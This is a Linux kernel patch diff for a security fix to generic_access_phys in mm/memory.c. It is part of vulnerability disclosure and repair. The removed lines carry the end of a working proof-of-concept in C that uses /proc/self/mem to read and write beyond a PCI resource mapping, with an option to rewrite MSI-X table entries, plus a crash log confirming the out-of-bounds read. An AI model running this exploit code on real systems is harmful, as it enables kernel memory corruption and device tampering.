-		die_perror("/proc/self/mem");
-
-	base_map = map_page(base_fd, 0, cfg.base_path);
-	next_map = map_page(next_fd, 0, cfg.next_path);
-	buf = calloc(1, total_len);
-	base_tail = calloc(1, cfg.tail);
-	next_bytes = calloc(1, cfg.cmp_len);
-	payload = calloc(1, total_len);
-	saved_next = calloc(1, cfg.cmp_len);
-	if (!buf || !base_tail || !next_bytes || !payload || !saved_next)
-		die_perror("calloc");
-
-	mem_off = (off_t)(uintptr_t)(base_map + PAGE_SZ - cfg.tail);
-	printf("base mapping: %s -> %p\n", cfg.base_path, base_map);
-	printf("next mapping: %s -> %p\n", cfg.next_path, next_map);
-	printf("proc-self-mem offset: 0x%llx\n", (unsigned long long)mem_off);
-	printf("request: start at base+0x%zx, read %zu bytes\n",
-	       PAGE_SZ - cfg.tail, total_len);
-
-	ret = checked_pread(mem_fd, buf, total_len, mem_off, "pread(/proc/self/mem)");
-	printf("pread(/proc/self/mem) returned %zd bytes\n", ret);
-	if ((size_t)ret != total_len) {
-		fprintf(stderr,
-			"short read: expected %zu bytes but got %zd\n",
-			total_len, ret);
-		goto out;
-	}
-
-	ret = checked_pread(mem_fd, base_tail, cfg.tail, mem_off,
-			    "pread(base tail via /proc/self/mem)");
-	if ((size_t)ret != cfg.tail) {
-		fprintf(stderr, "short base-tail read: expected %zu bytes but got %zd\n",
-			cfg.tail, ret);
-		goto out;
-	}
-
-	ret = checked_pread(mem_fd, next_bytes, cfg.cmp_len,
-			    (off_t)(uintptr_t)next_map,
-			    "pread(next mapping via /proc/self/mem)");
-	if ((size_t)ret != cfg.cmp_len) {
-		fprintf(stderr, "short next-page read: expected %zu bytes but got %zd\n",
-			cfg.cmp_len, ret);
-		goto out;
-	}
-
-	hexdump("base tail via direct /proc/self/mem read", base_tail, cfg.tail);
-	hexdump("next page via direct /proc/self/mem read", next_bytes, cfg.cmp_len);
-	hexdump("cross-boundary bytes via /proc/self/mem", buf, total_len);
-
-	if (memcmp(buf, base_tail, cfg.tail)) {
-		fprintf(stderr, "base tail mismatch\n");
-		goto out;
-	}
-
-	if (memcmp(buf + cfg.tail, next_bytes, cfg.cmp_len)) {
-		fprintf(stderr, "next page mismatch\n");
-		goto out;
-	}
-
-	printf("OOB read confirmed: bytes past the 4 KiB VMA boundary came from %s\n",
-	       cfg.next_path);
-
-	if (!cfg.do_write) {
-		rc = EXIT_SUCCESS;
-		goto out;
-	}
-
-	memcpy(saved_next, next_bytes, cfg.cmp_len);
-	memcpy(payload, base_tail, cfg.tail);
-	if (cfg.rewrite_msix_data) {
-		memcpy(payload + cfg.tail, next_bytes, cfg.cmp_len);
-		for (i = 0; i + 16 <= cfg.cmp_len; i += 16) {
-			uint32_t *addr_low = (uint32_t *)(payload + cfg.tail + i + 0);
-			uint32_t *addr_high = (uint32_t *)(payload + cfg.tail + i + 4);
-			uint32_t *data = (uint32_t *)(payload + cfg.tail + i + 8);
-			uint32_t *vector_ctl = (uint32_t *)(payload + cfg.tail + i + 12);
-
-			if (cfg.rewrite_msix_addr_low)
-				*addr_low = cfg.msix_addr_low;
-			if (cfg.rewrite_msix_addr_high)
-				*addr_high = cfg.msix_addr_high;
-			if (cfg.rewrite_msix_data)
-				*data = cfg.msix_data;
-			*vector_ctl = 0;
-		}
-	} else {
-		for (i = 0; i < cfg.cmp_len; i++)
-			payload[cfg.tail + i] = (unsigned char)(0xa0U + (i & 0x1f));
-	}
-
-	ret = checked_pwrite(mem_fd, payload, total_len, mem_off,
-			     "pwrite(/proc/self/mem)");
-	printf("pwrite(/proc/self/mem) returned %zd bytes\n", ret);
-	if ((size_t)ret != total_len) {
-		fprintf(stderr,
-			"short write: expected %zu bytes but got %zd\n",
-			total_len, ret);
-		goto out;
-	}
-
-	ret = checked_pread(mem_fd, next_bytes, cfg.cmp_len,
-			    (off_t)(uintptr_t)next_map,
-			    "verify next mapping after OOB write");
-	if ((size_t)ret != cfg.cmp_len) {
-		fprintf(stderr, "short next-page verify read: expected %zu bytes but got %zd\n",
-			cfg.cmp_len, ret);
-		goto out;
-	}
-
-	if (memcmp(next_bytes, payload + cfg.tail, cfg.cmp_len)) {
-		fprintf(stderr,
-			"OOB write verification failed: next mapping did not change\n");
-		goto out;
-	}
-
-	hexdump("next page after OOB write", next_bytes, cfg.cmp_len);
-	printf("OOB write confirmed: /proc/self/mem modified %s outside the mapped VMA\n",
-	       cfg.next_path);
-
-	if (!cfg.keep_corruption) {
-		memcpy(payload, base_tail, cfg.tail);
-		memcpy(payload + cfg.tail, saved_next, cfg.cmp_len);
-		ret = checked_pwrite(mem_fd, payload, total_len, mem_off,
-				     "restore pwrite(/proc/self/mem)");
-		if ((size_t)ret != total_len) {
-			fprintf(stderr, "failed to restore target bytes cleanly\n");
-			goto out;
-		}
-		printf("restored the overwritten target bytes\n");
-	}
-
-	rc = EXIT_SUCCESS;
-out:
-	free(saved_next);
-	free(payload);
-	free(next_bytes);
-	free(base_tail);
-	free(buf);
-	munmap(next_map, PAGE_SZ);
-	munmap(base_map, PAGE_SZ);
-	close(mem_fd);
-	close(next_fd);
-	close(base_fd);
-	return rc;
-}
-------END poc.c--------
-
-----BEGIN crash log----
-root@syzkaller:/mnt/home_host/new_poc# ./poc
-base mapping: /sys/bus/pci/devices/0000:00:02.0/resource2 -> 0x7f776a982000
-next mapping: /sys/bus/pci/devices/0000:00:03.0/resource1 -> 0x7f776a981000
-proc-self-mem offset: 0x7f776a982ff0
-request: start at base+0xff0, read 80 bytes
-[ 1503.056194][ T9289] resource: resource sanity check: requesting [mem 0x00000]
-[ 1503.057925][ T9289] caller generic_access_phys+0x12b/0x4c0 mapping multiple s
-pread(/proc/self/mem) returned 80 bytes
-base tail via direct /proc/self/mem read (16 bytes):
-  0000: ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff
-next page via direct /proc/self/mem read (64 bytes):
-  0000: 00 00 e0 fe 00 00 00 00 24 00 00 00 00 00 00 00
-  0010: 00 10 e0 fe 00 00 00 00 25 00 00 00 00 00 00 00
-  0020: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
-  0030: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
-cross-boundary bytes via /proc/self/mem (80 bytes):
-  0000: ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff
-  0010: 00 00 e0 fe 00 00 00 00 24 00 00 00 00 00 00 00
-  0020: 00 10 e0 fe 00 00 00 00 25 00 00 00 00 00 00 00
-  0030: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
-  0040: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
-OOB read confirmed: bytes past the 4 KiB VMA boundary came from /sys/bus/pci/de1
------END crash log-----
-
-Best regards,
-
-Luxiao Xu
-
-Luxiao Xu (1):
-  mm: fix out-of-bounds access and race in generic_access_phys
-
+Fixes: 9cb12d7b4cca ("mm/memory.c: actually remap enough memory")
+Cc: stable@vger.kernel.org
+Reported-by: Vega <vega@nebusec.ai>
+Assisted-by: Codex:gpt-5.4
+Signed-off-by: Luxiao Xu <rakukuip@gmail.com>
+Signed-off-by: Ren Wei <enjou1224z@gmail.com>
+---
  mm/memory.c | 79 ++++++++++++++++++++++++++++++-----------------------
  1 file changed, 45 insertions(+), 34 deletions(-)
 
+diff --git a/mm/memory.c b/mm/memory.c
+index ff338c2abe92..b2b1960dfdc4 100644
+--- a/mm/memory.c
++++ b/mm/memory.c
+@@ -6966,50 +6966,61 @@ EXPORT_SYMBOL_GPL(follow_pfnmap_end);
+ int generic_access_phys(struct vm_area_struct *vma, unsigned long addr,
+ 			void *buf, int len, int write)
+ {
+-	resource_size_t phys_addr;
+-	pgprot_t prot = __pgprot(0);
+-	void __iomem *maddr;
+-	int offset = offset_in_page(addr);
+-	int ret = -EINVAL;
+-	bool writable;
+-	struct follow_pfnmap_args args = { .vma = vma, .address = addr };
++	unsigned long offset = offset_in_page(addr);
++	int total_copied = 0;
++
++	while (len > 0) {
++		unsigned long chunk_len = min(len, (int)(PAGE_SIZE - offset));
++		resource_size_t phys_addr;
++		pgprot_t prot;
++		bool writable;
++		void __iomem *maddr;
++		struct follow_pfnmap_args args = { .vma = vma, .address = addr };
+ 
+ retry:
+-	if (follow_pfnmap_start(&args))
+-		return -EINVAL;
+-	prot = args.pgprot;
+-	phys_addr = (resource_size_t)args.pfn << PAGE_SHIFT;
+-	writable = args.writable;
+-	follow_pfnmap_end(&args);
++		if (follow_pfnmap_start(&args))
++			return total_copied ? total_copied : -EFAULT;
+ 
+-	if ((write & FOLL_WRITE) && !writable)
+-		return -EINVAL;
++		phys_addr = (resource_size_t)args.pfn << PAGE_SHIFT;
++		prot = args.pgprot;
++		writable = args.writable;
++		follow_pfnmap_end(&args);
+ 
+-	maddr = ioremap_prot(phys_addr, PAGE_ALIGN(len + offset), prot);
+-	if (!maddr)
+-		return -ENOMEM;
++		if ((write & FOLL_WRITE) && !writable)
++			return total_copied ? total_copied : -EACCES;
++
++		maddr = ioremap_prot(phys_addr, PAGE_SIZE, prot);
++		if (!maddr)
++			return total_copied ? total_copied : -ENOMEM;
++
++		if (follow_pfnmap_start(&args)) {
++			iounmap(maddr);
++			return total_copied ? total_copied : -EFAULT;
++		}
++
++		if ((pgprot_val(prot) != pgprot_val(args.pgprot)) ||
++		    (phys_addr != (args.pfn << PAGE_SHIFT)) ||
++		    (writable != args.writable)) {
++			follow_pfnmap_end(&args);
++			iounmap(maddr);
++			goto retry;
++		}
+ 
+-	if (follow_pfnmap_start(&args))
+-		goto out_unmap;
++		if (write)
++			memcpy_toio(maddr + offset, buf + total_copied, chunk_len);
++		else
++			memcpy_fromio(buf + total_copied, maddr + offset, chunk_len);
+ 
+-	if ((pgprot_val(prot) != pgprot_val(args.pgprot)) ||
+-	    (phys_addr != (args.pfn << PAGE_SHIFT)) ||
+-	    (writable != args.writable)) {
+ 		follow_pfnmap_end(&args);
+ 		iounmap(maddr);
+-		goto retry;
+-	}
+ 
+-	if (write)
+-		memcpy_toio(maddr + offset, buf, len);
+-	else
+-		memcpy_fromio(buf, maddr + offset, len);
+-	ret = len;
+-	follow_pfnmap_end(&args);
+-out_unmap:
+-	iounmap(maddr);
++		addr += chunk_len;
++		total_copied += chunk_len;
++		len -= chunk_len;
++		offset = 0;
++	}
+ 
+-	return ret;
++	return total_copied;
+ }
+ EXPORT_SYMBOL_GPL(generic_access_phys);
+ #endif
 -- 
 2.43.0
-
 
